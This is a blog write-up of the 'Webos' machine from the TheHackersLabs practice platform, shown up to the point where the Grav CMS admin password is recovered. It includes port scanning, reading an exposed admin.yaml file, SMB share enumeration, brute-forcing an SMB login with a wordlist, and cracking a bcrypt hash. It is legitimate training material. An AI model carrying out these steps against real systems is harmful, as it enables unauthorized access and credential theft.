<!doctype html><html lang=en><head><title>THL Webos WriteUp ¬∑ gunzf0x
</title><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=color-scheme content="light dark"><meta name=author content="gunzf0x"><meta name=description content="TheHackersLabs 'Webos' WriteUp"><meta name=keywords content="blog,pentesting,hacking,personal"><meta name=twitter:card content="summary"><meta name=twitter:title content="THL Webos WriteUp"><meta name=twitter:description content="TheHackersLabs 'Webos' WriteUp"><meta property="og:url" content="https://gunzf0x.github.io/pentesting/posts/webos/"><meta property="og:site_name" content="gunzf0x"><meta property="og:title" content="THL Webos WriteUp"><meta property="og:description" content="TheHackersLabs 'Webos' WriteUp"><meta property="og:locale" content="en"><meta property="og:type" content="article"><meta property="article:section" content="posts"><meta property="article:published_time" content="2024-09-16T00:00:00+00:00"><meta property="article:modified_time" content="2024-09-16T00:00:00+00:00"><meta property="article:tag" content="THL"><meta property="article:tag" content="Machine"><meta property="article:tag" content="Linux"><meta property="article:tag" content="Easy"><meta property="article:tag" content="Rce"><meta property="article:tag" content="Python"><link rel=canonical href=https://gunzf0x.github.io/pentesting/posts/webos/><link rel=preload href=/fonts/fa-brands-400.woff2 as=font type=font/woff2 crossorigin><link rel=preload href=/fonts/fa-regular-400.woff2 as=font type=font/woff2 crossorigin><link rel=preload href=/fonts/fa-solid-900.woff2 as=font type=font/woff2 crossorigin><link rel=stylesheet href=/pentesting/css/coder.min.577e3c5ead537873430da16f0964b754a120fd87c4e2203a00686e7c75b51378.css integrity="sha256-V348Xq1TeHNDDaFvCWS3VKEg/YfE4iA6AGhufHW1E3g=" crossorigin=anonymous media=screen><link rel=stylesheet href=/pentesting/css/coder-dark.min.b587cb1f00f2309d3943f06d512873c8c174188c45cb8406de0bfe6523023297.css integrity="sha256-tYfLHwDyMJ05Q/BtUShzyMF0GIxFy4QG3gv+ZSMCMpc=" crossorigin=anonymous media=screen><link rel=icon type=image/png href=/pentesting/images/favicon-32x32.png sizes=any><link rel=icon type=image/png href=/pentesting/images/favicon-32x32.png sizes=32x32><link rel=icon type=image/png href=/pentesting/images/favicon-16x16.png sizes=16x16><link rel=apple-touch-icon href=/pentesting/images/apple-touch-icon.png><link rel=apple-touch-icon sizes=180x180 href=/pentesting/images/apple-touch-icon.png><link rel=manifest href=/site.webmanifest><link rel=mask-icon href=/pentesting/images/safari-pinned-tab.svg color=#5bbad5></head><body class="preload-transitions colorscheme-auto"><div class=float-container><a id=dark-mode-toggle class=colorscheme-toggle><i class="fa-solid fa-adjust fa-fw" aria-hidden=true></i></a></div><main class=wrapper><nav class=navigation><section class=container><a class=navigation-title href=/pentesting>gunzf0x
</a><input type=checkbox id=menu-toggle>
<label class="menu-button float-right" for=menu-toggle><i class="fa-solid fa-bars fa-fw" aria-hidden=true></i></label><ul class=navigation-list><li class=navigation-item><a class=navigation-link href=/pentesting/about/>whoami</a></li><li class=navigation-item><a class=navigation-link href=/pentesting/posts/>Blog/WriteUps</a></li><li class=navigation-item><a class=navigation-link href=/pentesting/projects/>Projects</a></li><li class=navigation-item><a class=navigation-link href=/pentesting/contact/>Contact me</a></li><li class="navigation-item menu-separator"><span>|</span></li><li class=navigation-item><a href=/pentesting/es/posts/webos/>üá®üá±</a></li></ul></section></nav><div class=content><section class="container post"><article><header><div class=post-title><h1 class=title><a class=title-link href=https://gunzf0x.github.io/pentesting/posts/webos/>THL Webos WriteUp</a></h1></div><div class=post-meta><div class=date><span class=posted-on><i class="fa-solid fa-calendar" aria-hidden=true></i>
<time datetime=2024-09-16T00:00:00Z>16 September, 2024
</time></span><span class=reading-time><i class="fa-solid fa-clock" aria-hidden=true></i>
14-minute read</span></div><div class=tags><i class="fa-solid fa-tag" aria-hidden=true></i>
<span class=tag><a href=/pentesting/tags/thl/>THL</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/machine/>Machine</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/linux/>Linux</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/easy/>Easy</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/rce/>Rce</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/python/>Python</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/netcat/>Netcat</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/john/>John</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/grave-cms/>Grave Cms</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/gtfobins/>Gtfobins</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/gobuster/>Gobuster</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/capabilities/>Capabilities</a>
</span><span class=separator>‚Ä¢</span>
<span class=tag><a href=/pentesting/tags/whatweb/>Whatweb</a></span></div></div></header><div class=post-content><h1 id=webos----thehackerslabs>Webos &ndash; TheHackersLabs
<a class=heading-link href=#webos----thehackerslabs><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
<span class=sr-only>Link to heading</span></a></h1><ul><li>OS: <em>Linux</em></li><li>Difficulty: <em>Easy</em></li><li>Platform: <em>TheHackersLabs</em></li></ul><p><img alt="&lsquo;TheHackersLabs&rsquo; Avatar" src=/pentesting/images/TheHackersLabs_avatar.png></p><hr><h2 id=summary>Summary
<a class=heading-link href=#summary><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
<span class=sr-only>Link to heading</span></a></h2><p>&ldquo;Webos&rdquo; is an easy machine from <code>TheHackersLabs</code> platform. After an initial inspection to a <code>Samba</code> exposed service, we are able to brute force credentials for a user in this service. Inside this service, we are able to get and decode data that leads into credentials for a <code>Grav CMS</code> administration panel. We then are able to use the vulnerability <a href=https://nvd.nist.gov/vuln/detail/CVE-2024-28116 class=external-link target=_blank rel=noopener>CVE-2024-28116</a> to execute commands remotely and gain initial access to the victim machine. Once inside, we are able to execute a <code>Python</code> file that has capabilities, allowing us to become <code>root</code> user.</p><hr><h2 id=user>User
<a class=heading-link href=#user><i class="fa-solid fa-link" aria-hidden=true title="Link to heading"></i>
<span class=sr-only>Link to heading</span></a></h2><p>We start by sending a <code>ping</code> to the victim machine:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ ping -c1 10.20.1.128
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>PING 10.20.1.128 (10.20.1.128) 56(84) bytes of data.
</span></span></span><span class=line><span class=cl><span class=go>64 bytes from 10.20.1.128: icmp_seq=1 ttl=64 time=2.73 ms
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>--- 10.20.1.128 ping statistics ---
</span></span></span><span class=line><span class=cl><span class=go>1 packets transmitted, 1 received, 0% packet loss, time 0ms
</span></span></span><span class=line><span class=cl><span class=go>rtt min/avg/max/mdev = 2.727/2.727/2.727/0.000 ms
</span></span></span></code></pre></div><p>Based on this <code>TTL</code>, we are against a machine based on <code>Linux</code>.</p><p>We look for open <code>TCP</code> ports in this machine with <code>Nmap</code> running:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ sudo nmap -sS --open -p- --min-rate=5000 -n -Pn -vvv 10.20.1.128
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-05 15:53 -04
</span></span></span><span class=line><span class=cl><span class=go>Initiating ARP Ping Scan at 15:53
</span></span></span><span class=line><span class=cl><span class=go>Scanning 10.20.1.128 [1 port]
</span></span></span><span class=line><span class=cl><span class=go>Completed ARP Ping Scan at 15:53, 0.07s elapsed (1 total hosts)
</span></span></span><span class=line><span class=cl><span class=go>Initiating SYN Stealth Scan at 15:53
</span></span></span><span class=line><span class=cl><span class=go>Scanning 10.20.1.128 [65535 ports]
</span></span></span><span class=line><span class=cl><span class=go>Discovered open port 22/tcp on 10.20.1.128
</span></span></span><span class=line><span class=cl><span class=go>Discovered open port 139/tcp on 10.20.1.128
</span></span></span><span class=line><span class=cl><span class=go>Discovered open port 445/tcp on 10.20.1.128
</span></span></span><span class=line><span class=cl><span class=go>Discovered open port 80/tcp on 10.20.1.128
</span></span></span><span class=line><span class=cl><span class=go>Completed SYN Stealth Scan at 15:53, 2.73s elapsed (65535 total ports)
</span></span></span><span class=line><span class=cl><span class=go>Nmap scan report for 10.20.1.128
</span></span></span><span class=line><span class=cl><span class=go>Host is up, received arp-response (0.00031s latency).
</span></span></span><span class=line><span class=cl><span class=go>Scanned at 2024-09-05 15:53:50 -04 for 3s
</span></span></span><span class=line><span class=cl><span class=go>Not shown: 65531 closed tcp ports (reset)
</span></span></span><span class=line><span class=cl><span class=go>PORT    STATE SERVICE      REASON
</span></span></span><span class=line><span class=cl><span class=go>22/tcp  open  ssh          syn-ack ttl 64
</span></span></span><span class=line><span class=cl><span class=go>80/tcp  open  http         syn-ack ttl 64
</span></span></span><span class=line><span class=cl><span class=go>139/tcp open  netbios-ssn  syn-ack ttl 64
</span></span></span><span class=line><span class=cl><span class=go>445/tcp open  microsoft-ds syn-ack ttl 64
</span></span></span><span class=line><span class=cl><span class=go>MAC Address: 08:00:27:90:20:B8 (Oracle VirtualBox virtual NIC)
</span></span></span></code></pre></div><p>Where we can see 4 ports open: <code>22</code> <code>SSH</code>, <code>80</code> <code>HTTP</code>, <code>139</code> <code>NetBios</code> and <code>445</code> <code>Server Message Block</code> (<code>SMB</code>). Checking their versions, we have:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ sudo nmap -sVC -p22,80,139,445 10.20.1.128 -oN targeted
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-05 15:59 -04
</span></span></span><span class=line><span class=cl><span class=go>Nmap scan report for 10.20.1.128
</span></span></span><span class=line><span class=cl><span class=go>Host is up (0.00036s latency).
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>PORT    STATE SERVICE     VERSION
</span></span></span><span class=line><span class=cl><span class=go>22/tcp  open  ssh         OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
</span></span></span><span class=line><span class=cl><span class=go>| ssh-hostkey:
</span></span></span><span class=line><span class=cl><span class=go>|   256 d1:ab:7b:af:5c:3b:5e:52:23:9a:97:57:a8:aa:a1:f5 (ECDSA)
</span></span></span><span class=line><span class=cl><span class=go>|_  256 73:d9:ad:9e:c0:96:12:d8:ed:1b:ee:c0:15:ba:34:98 (ED25519)
</span></span></span><span class=line><span class=cl><span class=go>80/tcp  open  http        Apache httpd 2.4.59 ((Debian))
</span></span></span><span class=line><span class=cl><span class=go>|_http-generator: GravCMS
</span></span></span><span class=line><span class=cl><span class=go>|_http-title: webos.thl | Grav
</span></span></span><span class=line><span class=cl><span class=go>|_http-server-header: Apache/2.4.59 (Debian)
</span></span></span><span class=line><span class=cl><span class=go>| http-robots.txt: 13 disallowed entries
</span></span></span><span class=line><span class=cl><span class=go>| /.github/ /.phan/ /assets/ /backup/ /bin/ /cache/ /logs/
</span></span></span><span class=line><span class=cl><span class=go>|_/system/ /tests/ /tmp/ /user/ /vendor/ /webserver-configs/
</span></span></span><span class=line><span class=cl><span class=go>139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: THE HACKERS LABS - WEBOS)
</span></span></span><span class=line><span class=cl><span class=go>445/tcp open  netbios-ssn Samba smbd 4.17.12-Debian (workgroup: THE HACKERS LABS - WEBOS)
</span></span></span><span class=line><span class=cl><span class=go>MAC Address: 08:00:27:90:20:B8 (Oracle VirtualBox virtual NIC)
</span></span></span><span class=line><span class=cl><span class=go>Service Info: Host: THEHACKERSLABS-WEBOS; OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Host script results:
</span></span></span><span class=line><span class=cl><span class=go>| smb2-security-mode:
</span></span></span><span class=line><span class=cl><span class=go>|   3:1:1:
</span></span></span><span class=line><span class=cl><span class=go>|_    Message signing enabled but not required
</span></span></span><span class=line><span class=cl><span class=go>| smb2-time:
</span></span></span><span class=line><span class=cl><span class=go>|   date: 2024-09-05T20:00:00
</span></span></span><span class=line><span class=cl><span class=go>|_  start_date: N/A
</span></span></span><span class=line><span class=cl><span class=go>| smb-security-mode:
</span></span></span><span class=line><span class=cl><span class=go>|   account_used: guest
</span></span></span><span class=line><span class=cl><span class=go>|   authentication_level: user
</span></span></span><span class=line><span class=cl><span class=go>|   challenge_response: supported
</span></span></span><span class=line><span class=cl><span class=go>|_  message_signing: disabled (dangerous, but default)
</span></span></span><span class=line><span class=cl><span class=go>|_nbstat: NetBIOS name: , NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)
</span></span></span><span class=line><span class=cl><span class=go>| smb-os-discovery:
</span></span></span><span class=line><span class=cl><span class=go>|   OS: Windows 6.1 (Samba 4.17.12-Debian)
</span></span></span><span class=line><span class=cl><span class=go>|   Computer name: thehackerslabs-webos
</span></span></span><span class=line><span class=cl><span class=go>|   NetBIOS computer name: THEHACKERSLABS-WEBOS\x00
</span></span></span><span class=line><span class=cl><span class=go>|   Domain name:
</span></span></span><span class=line><span class=cl><span class=go>|   FQDN: thehackerslabs-webos
</span></span></span><span class=line><span class=cl><span class=go>|_  System time: 2024-09-05T22:00:00+02:00
</span></span></span><span class=line><span class=cl><span class=go>|_clock-skew: mean: -40m01s, deviation: 1h09m16s, median: -1s
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span></span><span class=line><span class=cl><span class=go>Nmap done: 1 IP address (1 host up) scanned in 32.30 seconds
</span></span></span></code></pre></div><p>As expected, <code>NetBios</code> and <code>Server Message Block|SMB</code> are services for machines based on <code>Windows</code>, but to run it on <code>Linux</code> it is using <code>Samba</code> service.</p><p>If we use <code>WhatWeb</code> tool against the <code>HTTP</code> website we obtain:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ whatweb -a 3 http://10.20.1.128
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>http://10.20.1.128 [200 OK] Apache[2.4.59], Cookies[grav-site-40d1b2d], Country[RESERVED][ZZ], HTML5, HTTPServer[Debian Linux][Apache/2.4.59 (Debian)], HttpOnly[grav-site-40d1b2d], IP[10.20.1.128], JQuery, MetaGenerator[GravCMS], PasswordField[password], Script, Title[webos.thl | Grav], X-UA-Compatible[IE=edge]
</span></span></span></code></pre></div><p>I can see this site is using <code>Grav CMS</code>. Searching for <code>what is grav</code> we find <a href=https://getgrav.org/ class=external-link target=_blank rel=noopener>its webpage</a>, where they give a description for it:</p><div class="notice info"><div class=notice-title><i class="fa-solid fa-exclamation-circle" aria-hidden=true></i>Info</div><div class=notice-content><code>Grav</code> is a modern, Crazy Fast, Ridiculously Easy and Powerful Flat-File <code>Content Management System</code>.</div></div><p>Visiting the website (<code>http://10.20.1.128</code> in my case) shows a login panel:</p><p>![Webos 1][(/images/Webos_1.png)</p><p>I check the files but I don&rsquo;t find anything interesting at the moment. So I will come back to the website later.</p><p>Based on <a href=https://learn.getgrav.org/17/admin-panel/introduction#creating-a-user class=external-link target=_blank rel=noopener>Grav CMS documentation</a>, when we create a user the data is stored at <code>/user/accounts</code> directory. We can check if this directory exists on a terminal with <code>cURL</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ curl -s http://10.20.1.128/user/accounts/ | html2text
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>****** Index of /user/accounts ******
</span></span></span><span class=line><span class=cl><span class=go>`ICO`       Name             Last modified    Size Description
</span></span></span><span class=line><span class=cl><span class=go>===========================================================================
</span></span></span><span class=line><span class=cl><span class=go>`PARENTDIR` Parent Directory ¬†                   - ¬†
</span></span></span><span class=line><span class=cl><span class=go>`   `       admin.yaml       2024-07-06 14:18  362 ¬†
</span></span></span><span class=line><span class=cl><span class=go>===========================================================================
</span></span></span><span class=line><span class=cl><span class=go>     Apache/2.4.59 (Debian) Server at 10.20.1.128 Port 80
</span></span></span></code></pre></div><p>where we have a file at <code>http://10.20.1.128/user/accounts/admin.yaml</code>.</p><p>If we check this file we have something:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ curl -s http://10.20.1.128/user/accounts/admin.yaml
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>state: enabled
</span></span></span><span class=line><span class=cl><span class=go>email: admin@thehackerslabs.com
</span></span></span><span class=line><span class=cl><span class=go>fullname: TheHackersLabs
</span></span></span><span class=line><span class=cl><span class=go>title: Administrator
</span></span></span><span class=line><span class=cl><span class=go>hashed_password: $2y$10$F0k5Ajn42KuhpoAN3Y7FXevY5W2MKHQpwpCKg7EzDxlayLD.iwVJC
</span></span></span><span class=line><span class=cl><span class=go>language: es
</span></span></span><span class=line><span class=cl><span class=go>content_editor: default
</span></span></span><span class=line><span class=cl><span class=go>twofa_enabled: false
</span></span></span><span class=line><span class=cl><span class=go>twofa_secret: NVNYOYB5IL3NPUKKRX4E6BPCTRWRQNFQ
</span></span></span><span class=line><span class=cl><span class=go>avatar: {  }
</span></span></span><span class=line><span class=cl><span class=go>access:
</span></span></span><span class=line><span class=cl><span class=go>  site:
</span></span></span><span class=line><span class=cl><span class=go>    login: true
</span></span></span><span class=line><span class=cl><span class=go>  admin:
</span></span></span><span class=line><span class=cl><span class=go>    login: true
</span></span></span><span class=line><span class=cl><span class=go>    super: true
</span></span></span></code></pre></div><p>but I am not able to crack this hash.</p><p>At this point I will go to <code>SMB</code> service. Based on <code>Nmap</code> scan, I can see we can log in with <code>guest</code> user in this service. Checking what shares this user has with <code>CrackMapExec|NetExec</code> tool we obtain:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ netexec smb 10.20.1.128 -u guest -p &#39;&#39; --shares
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>SMB         10.20.1.128     445    THEHACKERSLABS-WEBOS [*] Windows 6.1 (name:THEHACKERSLABS-WEBOS) (domain:THEHACKERSLABS-WEBOS) (signing:False) (SMBv1:True)
</span></span></span><span class=line><span class=cl><span class=go>SMB         10.20.1.128     445    THEHACKERSLABS-WEBOS [+] THEHACKERSLABS-WEBOS\guest:
</span></span></span><span class=line><span class=cl><span class=go>SMB         10.20.1.128     445    THEHACKERSLABS-WEBOS [*] Enumerated shares
</span></span></span><span class=line><span class=cl><span class=go>SMB         10.20.1.128     445    THEHACKERSLABS-WEBOS Share           Permissions     Remark
</span></span></span><span class=line><span class=cl><span class=go>SMB         10.20.1.128     445    THEHACKERSLABS-WEBOS -----           -----------     ------
</span></span></span><span class=line><span class=cl><span class=go>SMB         10.20.1.128     445    THEHACKERSLABS-WEBOS print$                          Printer Drivers
</span></span></span><span class=line><span class=cl><span class=go>SMB         10.20.1.128     445    THEHACKERSLABS-WEBOS webos                           Archivo compartido en Samba
</span></span></span><span class=line><span class=cl><span class=go>SMB         10.20.1.128     445    THEHACKERSLABS-WEBOS IPC$                            IPC Service (Samba 4.17.12-Debian)
</span></span></span><span class=line><span class=cl><span class=go>SMB         10.20.1.128     445    THEHACKERSLABS-WEBOS nobody                          Home Directories
</span></span></span></code></pre></div><p>I can see 2 non-default shares: <code>webos</code> and <code>nobody</code>.</p><p>We can then use <code>NetExec</code> again to perform a <code>Brute Force Password Login</code>. If this is a share for <code>/home</code> this could mean that we can have a <code>webos</code> and/or <code>nobody</code> (but this last user is usually a added by some services, so we can skip it for now):</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ netexec smb 10.20.1.128 -u &#39;webos&#39; -p /usr/share/wordlists/rockyou.txt --ignore-pw-decoding
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>SMB         10.20.1.128     445    THEHACKERSLABS-WEBOS [*] Windows 6.1 (name:THEHACKERSLABS-WEBOS) (domain:THEHACKERSLABS-WEBOS) (signing:False) (SMBv1:True)
</span></span></span><span class=line><span class=cl><span class=go>SMB         10.20.1.128     445    THEHACKERSLABS-WEBOS [-] THEHACKERSLABS-WEBOS\webos:123456 STATUS_LOGON_FAILURE
</span></span></span><span class=line><span class=cl><span class=go>SMB         10.20.1.128     445    THEHACKERSLABS-WEBOS [-] THEHACKERSLABS-WEBOS\webos:12345 STATUS_LOGON_FAILURE
</span></span></span><span class=line><span class=cl><span class=go>&lt;SNIP&gt;
</span></span></span><span class=line><span class=cl><span class=go>SMB         10.20.1.128     445    THEHACKERSLABS-WEBOS [-] THEHACKERSLABS-WEBOS\webos:father STATUS_LOGON_FAILURE
</span></span></span><span class=line><span class=cl><span class=go>SMB         10.20.1.128     445    THEHACKERSLABS-WEBOS [-] THEHACKERSLABS-WEBOS\webos:77777 STATUS_LOGON_FAILURE
</span></span></span><span class=line><span class=cl><span class=go>SMB         10.20.1.128     445    THEHACKERSLABS-WEBOS [+] THEHACKERSLABS-WEBOS\webos:geraldine
</span></span></span></code></pre></div><p>and we get credentials: <code>webos:geraldine</code>.</p><p>Checking what shares resources can this user read we have 2:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ netexec smb 10.20.1.128 -u &#39;webos&#39; -p &#39;geraldine&#39; --shares --filter-shares READ WRITE
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>SMB         10.20.1.128     445    THEHACKERSLABS-WEBOS [*] Windows 6.1 (name:THEHACKERSLABS-WEBOS) (domain:THEHACKERSLABS-WEBOS) (signing:False) (SMBv1:True)
</span></span></span><span class=line><span class=cl><span class=go>SMB         10.20.1.128     445    THEHACKERSLABS-WEBOS [+] THEHACKERSLABS-WEBOS\webos:geraldine
</span></span></span><span class=line><span class=cl><span class=go>SMB         10.20.1.128     445    THEHACKERSLABS-WEBOS [*] Enumerated shares
</span></span></span><span class=line><span class=cl><span class=go>SMB         10.20.1.128     445    THEHACKERSLABS-WEBOS Share           Permissions     Remark
</span></span></span><span class=line><span class=cl><span class=go>SMB         10.20.1.128     445    THEHACKERSLABS-WEBOS -----           -----------     ------
</span></span></span><span class=line><span class=cl><span class=go>SMB         10.20.1.128     445    THEHACKERSLABS-WEBOS print$          READ            Printer Drivers
</span></span></span><span class=line><span class=cl><span class=go>SMB         10.20.1.128     445    THEHACKERSLABS-WEBOS webos           READ            Archivo compartido en Samba
</span></span></span></code></pre></div><p>where <code>webos</code> seems interesting.</p><p>Looking what is inside this shared resource with <code>smbmap</code> shows a <code>.txt</code> file:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ smbmap -H 10.20.1.128 -u &#39;webos&#39; -p &#39;geraldine&#39; -r &#39;webos&#39; --no-banner
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>[*] Detected 1 hosts serving SMB
</span></span></span><span class=line><span class=cl><span class=go>[*] Established 1 SMB connections(s) and 1 authenticated session(s)
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>[+] IP: 10.20.1.128:445 Name: 10.20.1.128               Status: Authenticated
</span></span></span><span class=line><span class=cl><span class=go>        Disk                                                    Permissions     Comment
</span></span></span><span class=line><span class=cl><span class=go>        ----                                                    -----------     -------
</span></span></span><span class=line><span class=cl><span class=go>        print$                                                  READ ONLY       Printer Drivers
</span></span></span><span class=line><span class=cl><span class=go>        webos                                                   READ ONLY       Archivo compartido en Samba
</span></span></span><span class=line><span class=cl><span class=go>        ./webos
</span></span></span><span class=line><span class=cl><span class=go>        dr--r--r--                0 Wed Jul 17 14:47:07 2024    .
</span></span></span><span class=line><span class=cl><span class=go>        dr--r--r--                0 Thu Jul 18 05:31:55 2024    ..
</span></span></span><span class=line><span class=cl><span class=go>        fr--r--r--              245 Wed Jul 17 14:47:07 2024    Mama√ëema.txt
</span></span></span><span class=line><span class=cl><span class=go>        IPC$                                                    NO ACCESS       IPC Service (Samba 4.17.12-Debian)
</span></span></span></code></pre></div><p>We can then use <code>smbmap</code> again to download this file:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ smbmap -H 10.20.1.128 -u &#39;webos&#39; -p &#39;geraldine&#39; --download &#39;webos/Mama√ëema.txt&#39; --no-banner
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>[*] Detected 1 hosts serving SMB
</span></span></span><span class=line><span class=cl><span class=go>[*] Established 1 SMB connections(s) and 1 authenticated session(s)
</span></span></span><span class=line><span class=cl><span class=go>[+] Starting download: webos\Mama√ëema.txt (245 bytes)
</span></span></span><span class=line><span class=cl><span class=go>[+] File output to: /home/gunzf0x/OtherMachines/TheHackersLabs/Webos/content/10.20.1.128-webos_Mama√ëema.txt
</span></span></span><span class=line><span class=cl><span class=go>[*] Closed 1 connections
</span></span></span></code></pre></div><p>Reading this file shows a message that could be in <code>Brainfuck</code> language:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ cat 10.20.1.128-webos_Mama√ëema.txt
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>++++++++++[&gt;++++++++++&gt;++++++++++&gt;+++++++++++&gt;+++++++++++&gt;+++++++++++&gt;++++++&gt;++++++++&gt;++++++++++&gt;+++++++++++&gt;+++++++++++&gt;++++++++++&gt;+++++++++++&gt;+++++&gt;++++++&gt;++++&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;-]&gt;---.&gt;.&gt;-.&gt;-----.&gt;.&gt;--.&gt;.&gt;+.&gt;++++.&gt;-----.&gt;-.&gt;+.&gt;++++.&gt;---.&gt;++.....
</span></span></span></code></pre></div><p>We can then go to <a href=https://www.dcode.fr/brainfuck-language class=external-link target=_blank rel=noopener>this page</a>, paste its content and decode the hidden message:</p><p><img alt="Webos 2" src=/pentesting/images/Webos_2.png></p><p>Apparently, it contains credentials: <code>admin:Perico69*****</code>.</p><p>I remember the <code>admin.yml</code> file we previously found. To check if this is the password for this user, locally, we can create a file only containing this password and then see if it is cracked with <code>JohnTheRipper</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ echo &#39;Perico69*****&#39; &gt; admin_found_credentials.txt
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>‚ùØ john --wordlist=./admin_found_credentials.txt admin_hash
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Using default input encoding: UTF-8
</span></span></span><span class=line><span class=cl><span class=go>Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
</span></span></span><span class=line><span class=cl><span class=go>Cost 1 (iteration count) is 1024 for all loaded hashes
</span></span></span><span class=line><span class=cl><span class=go>Will run 5 OpenMP threads
</span></span></span><span class=line><span class=cl><span class=go>Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status
</span></span></span><span class=line><span class=cl><span class=go>Warning: Only 1 candidate left, minimum 15 needed for performance.
</span></span></span><span class=line><span class=cl><span class=go>Perico69*****    (?)
</span></span></span><span class=line><span class=cl><span class=go>1g 0:00:00:00 DONE (2024-09-05 18:28) 10.00g/s 10.00p/s 10.00c/s 10.00C/s Perico69*****
</span></span></span><span class=line><span class=cl><span class=go>Use the &#34;--show&#34; option to display all of the cracked passwords reliably
</span></span></span><span class=line><span class=cl><span class=go>Session completed.
</span></span></span></code></pre></div><p>and they match. So, basically, <code>Perico69*****</code> is the cracked password from the hash we previously have found for <code>Grav CMS</code>.
